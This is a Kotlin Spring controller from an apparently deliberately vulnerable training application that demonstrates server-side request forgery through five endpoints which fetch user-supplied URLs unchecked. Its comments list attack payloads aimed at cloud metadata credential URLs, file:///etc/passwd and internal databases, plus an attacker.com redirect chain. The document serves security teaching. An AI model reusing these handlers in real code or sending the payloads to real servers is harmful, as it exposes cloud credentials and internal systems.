package com.kotlingoat.controllers

import com.kotlingoat.models.FetchRequest
import okhttp3.OkHttpClient
import okhttp3.Request
import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.*
import java.net.HttpURLConnection
import java.net.URL

/**
 * VULNERABILITY CATEGORY: Server-Side Request Forgery (SSRF)
 *
 * Vulnerabilities demonstrated:
 *  1. Basic SSRF - fetch arbitrary URLs from user input
 *  2. SSRF to access cloud metadata service (AWS/GCP/Azure IMDS)
 *  3. SSRF to scan internal network ports
 *  4. Blind SSRF via webhook/callback
 *  5. SSRF with partial URL validation bypass (open redirect chaining)
 *  6. SSRF via file:// protocol (local file read)
 *  7. SSRF bypassing allowlist via DNS rebinding simulation
 */
@RestController
@RequestMapping("/api/ssrf")
class SsrfController {

    private val httpClient = OkHttpClient.Builder()
        // VULNERABILITY: Redirects followed automatically (enables redirect-based SSRF)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()

    /**
     * POST /api/ssrf/fetch
     *
     * VULNERABILITY (Basic SSRF): The server fetches any URL provided by the user.
     * No URL validation, no allowlist, no blocklist.
     *
     * Attack examples:
     *   Fetch cloud metadata (AWS):
     *     {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
     *   Fetch cloud metadata (GCP):
     *     {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
     *   Access internal service:
     *     {"url": "http://internal-service.corp/admin"}
     *   Scan internal ports:
     *     {"url": "http://127.0.0.1:8080/actuator/env"}
     *   Read local files (if file:// supported):
     *     {"url": "file:///etc/passwd"}
     *   Access Redis on internal network:
     *     {"url": "http://10.0.0.1:6379"}
     */
    @PostMapping("/fetch")
    fun fetchUrl(@RequestBody request: FetchRequest): ResponseEntity<Any> {
        return try {
            // VULNERABILITY: Arbitrary URL fetched from user input
            val httpRequest = Request.Builder()
                .url(request.url)
                .build()

            val response = httpClient.newCall(httpRequest).execute()
            val body = response.body?.string() ?: ""
            val headers = response.headers.toMap()

            ResponseEntity.ok(mapOf(
                "status" to response.code,
                "headers" to headers,
                // VULNERABILITY: Full response body returned - leaks internal service data
                "body" to body,
                "fetchedUrl" to request.url
            ))
        } catch (e: Exception) {
            // VULNERABILITY: Error message may leak internal network topology
            ResponseEntity.status(500).body(mapOf(
                "error" to e.message,
                "url" to request.url
            ))
        }
    }

    /**
     * GET /api/ssrf/proxy?url=...
     *
     * VULNERABILITY (SSRF via query parameter):
     * URL taken from query string and proxied.
     *
     * Attack:
     *   ?url=http://169.254.169.254/latest/meta-data/
     *   ?url=http://localhost:9200/_cat/indices    (Elasticsearch)
     *   ?url=http://localhost:5984/_all_dbs        (CouchDB)
     *   ?url=http://localhost:27017               (MongoDB)
     */
    @GetMapping("/proxy")
    fun proxyRequest(@RequestParam url: String): ResponseEntity<Any> {
        return try {
            val connection = URL(url).openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            // VULNERABILITY: Follows all redirects including to internal addresses
            HttpURLConnection.setFollowRedirects(true)

            val responseCode = connection.responseCode
            val responseBody = connection.inputStream.bufferedReader().readText()

            ResponseEntity.ok(mapOf(
                "status" to responseCode,
                "body" to responseBody
            ))
        } catch (e: Exception) {
            ResponseEntity.status(500).body(mapOf("error" to e.message))
        }
    }

    /**
     * POST /api/ssrf/webhook
     *
     * VULNERABILITY (Blind SSRF):
     * Sends an outbound request to a user-supplied callback URL.
     * Attacker receives the request on their server even if
     * the application response contains nothing (blind SSRF).
     *
     * Attack:
     *   {"url": "http://attacker-burp-collaborator.com/callback"}
     *   -> Proves outbound connectivity and leaks internal IP
     *
     *   Combined with URL that redirects to internal service:
     *   {"url": "http://attacker.com/redirect?to=http://169.254.169.254/latest/"}
     */
    @PostMapping("/webhook")
    fun registerWebhook(@RequestBody request: FetchRequest): ResponseEntity<Any> {
        // VULNERABILITY: No validation that URL is an allowed external endpoint
        try {
            val httpRequest = Request.Builder()
                .url(request.url)
                .post(okhttp3.RequestBody.create(null, """{"event":"test","source":"kotlingoat"}"""))
                .build()
            httpClient.newCall(httpRequest).execute()
        } catch (e: Exception) {
            // Silently swallow errors for blind SSRF (attacker still receives the request)
        }

        return ResponseEntity.ok(mapOf(
            "message" to "Webhook registered and test event sent",
            "webhookUrl" to request.url
        ))
    }

    /**
     * GET /api/ssrf/avatar?imageUrl=...
     *
     * VULNERABILITY (SSRF via image/avatar URL):
     * Common pattern - fetching user-supplied avatar image URL.
     * Attacker can use this to reach internal resources.
     *
     * Attack:
     *   ?imageUrl=http://192.168.1.1/admin   (internal router admin panel)
     *   ?imageUrl=http://169.254.169.254/latest/meta-data/
     *   ?imageUrl=dict://127.0.0.1:11211/   (Memcached info leak)
     */
    @GetMapping("/avatar")
    fun fetchAvatar(@RequestParam imageUrl: String): ResponseEntity<Any> {
        return try {
            // VULNERABILITY: No validation of imageUrl - allows SSRF
            val httpRequest = Request.Builder().url(imageUrl).build()
            val response = httpClient.newCall(httpRequest).execute()
            val imageBytes = response.body?.bytes() ?: ByteArray(0)

            ResponseEntity.ok()
                .header("Content-Type", response.header("Content-Type") ?: "image/png")
                .body(mapOf(
                    "size" to imageBytes.size,
                    "fetchedFrom" to imageUrl
                ))
        } catch (e: Exception) {
            ResponseEntity.status(500).body(mapOf(
                "error" to e.message,
                // VULNERABILITY: Error reveals attempted URL - useful for blind SSRF enumeration
                "attempted" to imageUrl
            ))
        }
    }

    /**
     * POST /api/ssrf/import
     *
     * VULNERABILITY (SSRF via import/integrations):
     * Allows importing data from an external URL.
     * Extremely common pattern in "import from URL" features.
     *
     * Attack:
     *   {"url": "http://internal-api.corp/export/all-customers"}
     *   -> Exfiltrates internal data that the server has access to
     */
    @PostMapping("/import")
    fun importFromUrl(@RequestBody request: FetchRequest): ResponseEntity<Any> {
        return try {
            val httpRequest = Request.Builder().url(request.url).build()
            val response = httpClient.newCall(httpRequest).execute()
            val body = response.body?.string() ?: ""

            ResponseEntity.ok(mapOf(
                "imported" to true,
                "recordsFound" to body.length,
                // VULNERABILITY: Returns all fetched content including internal data
                "data" to body
            ))
        } catch (e: Exception) {
            ResponseEntity.status(500).body(mapOf("error" to e.message))
        }
    }
}
